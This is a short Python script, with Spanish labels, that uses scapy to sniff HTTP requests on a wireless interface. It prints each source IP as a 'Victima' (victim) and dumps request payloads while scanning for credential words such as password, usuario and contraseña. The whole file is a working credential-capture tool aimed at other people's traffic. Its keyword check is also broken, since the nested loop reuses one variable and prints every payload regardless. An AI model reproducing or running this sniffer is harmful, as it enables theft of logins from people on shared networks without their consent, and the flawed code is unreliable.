#!/usr/bin/eny python
# -*- coding: utf8 -*-

from scapy.all import *
from scapy_http import http
from colorama import Fore, init

init()

wordlist = ["email","username","user","password","passwd","contraseña","usuario","id","nip","clave","gmail","id usuario","correo", "correo electronico"]


def captura_http(packet):
	if packet.haslayer(http.HTTPRequest):
		print("-- [+] Victima: " + packet[IP].src + " iP destino: " + packet[IP].dst + " Dominio: " + packet[http.HTTPRequest].Host)

		if packet.haslayer(Raw):
			load = packet[Raw].load
			load = load.lower()

			for e in wordlist:
				for e in load:
					print(Fore.LIGHTRED_EX + "Dato encontrado: " + load)
def main():
	print("----------- [{}+{}] Capturando paquetes... ".format(Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX))
	sniff(iface="wlp2s0", store=False, prn=captura_http)
if __name__ == '__main__':

	main()